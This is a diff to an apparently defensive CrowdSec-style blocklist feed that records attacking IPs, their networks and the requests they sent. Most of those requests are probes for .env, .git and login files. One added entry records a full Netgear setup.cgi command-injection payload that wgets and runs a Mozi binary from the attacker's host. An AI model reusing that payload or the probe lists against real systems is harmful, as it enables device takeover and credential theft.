@@ -1,87 +1,13 @@
 {
-  "generated_at": "2026-09-16T01:00:00Z",
+  "generated_at": "2026-09-16T12:00:00Z",
   "ttl_days": 7,
   "scope": "crowdsec",
   "counts": {
-    "total": 58,
-    "v4": 58,
+    "total": 60,
+    "v4": 60,
     "v6": 0
   },
   "items": [
-    {
-      "ip": "216.218.206.66",
-      "family": "v4",
-      "first_seen": "2026-09-09T01:00:00Z",
-      "last_seen": "2026-09-09T09:00:00Z",
-      "scenarios": [
-        "crowdsec/http-technology-probing"
-      ],
-      "sources": [
-        "crowdsec"
-      ],
-      "asn": "6939",
-      "asn_name": "HURRICANE - Hurricane Electric LLC",
-      "asn_prefix": "216.218.128.0/17",
-      "payloads": [
-        "GET /remote/logincheck"
-      ]
-    },
-    {
-      "ip": "104.244.79.113",
-      "family": "v4",
-      "first_seen": "2026-09-09T06:00:00Z",
-      "last_seen": "2026-09-09T06:00:00Z",
-      "scenarios": [
-        "crowdsec/http-technology-probing"
-      ],
-      "sources": [
-        "crowdsec"
-      ],
-      "asn": "53667",
-      "asn_name": "PONYNET - FranTech Solutions",
-      "asn_prefix": "104.244.79.0/24",
-      "payloads": [
-        "GET /cgi-bin/luci/"
-      ]
-    },
-    {
-      "ip": "34.51.186.70",
-      "family": "v4",
-      "first_seen": "2026-09-09T06:00:00Z",
-      "last_seen": "2026-09-09T06:00:00Z",
-      "scenarios": [
-        "crowdsec/http-admin-interface-probing",
-        "crowdsec/http-probing",
-        "crowdsec/http-sensitive-files",
-        "crowdsec/http-technology-probing"
-      ],
-      "sources": [
-        "crowdsec"
-      ],
-      "asn": "396982",
-      "asn_name": "GOOGLE-CLOUD-PLATFORM - Google LLC",
-      "asn_prefix": "34.51.128.0/17",
-      "tags": [
-        "mwl:cloud=\"gcp\""
-      ],
-      "payloads": [
-        "GET /info.php",
-        "GET /admin/.env",
-        "GET /admin-panel/.env",
-        "GET /administrator/.env",
-        "GET /",
-        "GET /.git/config",
-        "GET /.env",
-        "GET /.env.local",
-        "GET /.env.production",
-        "GET /.env.staging",
-        "GET /.env.development",
-        "GET /.env.test",
-        "GET /.env.remote",
-        "GET /.env.bak",
-        "GET /.env.backup"
-      ]
-    },
     {
       "ip": "104.248.64.160",
       "family": "v4",
@@ -1702,6 +1628,161 @@
       "payloads": [
         "GET /info.php",
         "GET /admin-panel/.env",
+        "GET /administrator/.env",
+        "GET /phpinfo.php",
+        "GET /",
+        "GET /.git/config",
+        "GET /.env",
+        "GET /.env.local",
+        "GET /.env.production",
+        "GET /.env.staging",
+        "GET /.env.development",
+        "GET /.env.test",
+        "GET /.env.remote",
+        "GET /.env.bak",
+        "GET /.env.backup"
+      ]
+    },
+    {
+      "ip": "202.47.46.57",
+      "family": "v4",
+      "first_seen": "2026-09-16T11:00:00Z",
+      "last_seen": "2026-09-16T11:00:00Z",
+      "scenarios": [
+        "crowdsec/http-cve-probing",
+        "crowdsec/netgear_rce"
+      ],
+      "sources": [
+        "crowdsec"
+      ],
+      "asn": "9541",
+      "asn_name": "CYBERNET-AP - Cyber Internet Services (Pvt) Ltd.",
+      "asn_prefix": "202.47.46.0/24",
+      "payloads": [
+        "GET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*&wget+http://202.47.46.57:56597/Mozi.m+-O+/tmp/netgear&sh+netgear&curpath=/&currentsetting.htm=1"
+      ]
+    },
+    {
+      "ip": "23.27.211.182",
+      "family": "v4",
+      "first_seen": "2026-09-16T10:00:00Z",
+      "last_seen": "2026-09-16T10:00:00Z",
+      "scenarios": [
+        "crowdsec/http-probing",
+        "crowdsec/http-sensitive-files"
+      ],
+      "sources": [
+        "crowdsec"
+      ],
+      "asn": "397032",
+      "asn_name": "SPARKED - SPARKED HOST LLC",
+      "asn_prefix": "23.27.211.0/24",
+      "payloads": [
+        "GET /",
+        "GET /.env",
+        "GET /.env.example",
+        "GET /backend/.env",
+        "GET /.env.local",
+        "GET /.env.staging",
+        "GET /server/.env",
+        "GET /src/.env",
+        "GET /.env.production.local",
+        "GET /.env.local.bak",
+        "GET /.env.development.local"
+      ]
+    },
+    {
+      "ip": "216.180.246.118",
+      "family": "v4",
+      "first_seen": "2026-09-16T05:00:00Z",
+      "last_seen": "2026-09-16T05:00:00Z",
+      "scenarios": [
+        "crowdsec/http-admin-interface-probing",
+        "crowdsec/http-probing",
+        "crowdsec/http-technology-probing"
+      ],
+      "sources": [
+        "crowdsec"
+      ],
+      "asn": "396982",
+      "asn_name": "GOOGLE-CLOUD-PLATFORM - Google LLC",
+      "asn_prefix": "216.180.246.0/24",
+      "payloads": [
+        "GET /admin/index.html",
+        "GET /+CSCOE+/logon.html",
+        "GET /remote/login",
+        "GET /",
+        "GET /manage/account/login",
+        "GET /index.html",
+        "GET /cgi-bin/login.cgi",
+        "GET /login.htm",
+        "GET /login.html",
+        "GET /login.jsp",
+        "GET /login",
+        "GET /doc/index.html"
+      ]
+    },
+    {
+      "ip": "34.9.6.1",
+      "family": "v4",
+      "first_seen": "2026-09-16T04:00:00Z",
+      "last_seen": "2026-09-16T04:00:00Z",
+      "scenarios": [
+        "crowdsec/http-admin-interface-probing",
+        "crowdsec/http-probing",
+        "crowdsec/http-sensitive-files",
+        "crowdsec/http-technology-probing"
+      ],
+      "sources": [
+        "crowdsec"
+      ],
+      "asn": "396982",
+      "asn_name": "GOOGLE-CLOUD-PLATFORM - Google LLC",
+      "asn_prefix": "34.9.0.0/16",
+      "tags": [
+        "mwl:cloud=\"gcp\""
+      ],
+      "payloads": [
+        "GET /administrator/.env",
+        "GET /phpinfo.php",
+        "GET /phpinfo",
+        "GET /info.php",
+        "GET /",
+        "GET /.git/config",
+        "GET /.env",
+        "GET /.env.local",
+        "GET /.env.production",
+        "GET /.env.staging",
+        "GET /.env.development",
+        "GET /.env.test",
+        "GET /.env.remote",
+        "GET /.env.bak",
+        "GET /.env.backup"
+      ]
+    },
+    {
+      "ip": "34.165.140.217",
+      "family": "v4",
+      "first_seen": "2026-09-16T01:00:00Z",
+      "last_seen": "2026-09-16T01:00:00Z",
+      "scenarios": [
+        "crowdsec/http-admin-interface-probing",
+        "crowdsec/http-probing",
+        "crowdsec/http-sensitive-files",
+        "crowdsec/http-technology-probing"
+      ],
+      "sources": [
+        "crowdsec"
+      ],
+      "asn": "396982",
+      "asn_name": "GOOGLE-CLOUD-PLATFORM - Google LLC",
+      "asn_prefix": "34.165.128.0/17",
+      "tags": [
+        "mwl:cloud=\"gcp\""
+      ],
+      "payloads": [
+        "GET /info.php",
+        "GET /admin/.env",
         "GET /administrator/.env",
         "GET /phpinfo.php",
         "GET /",
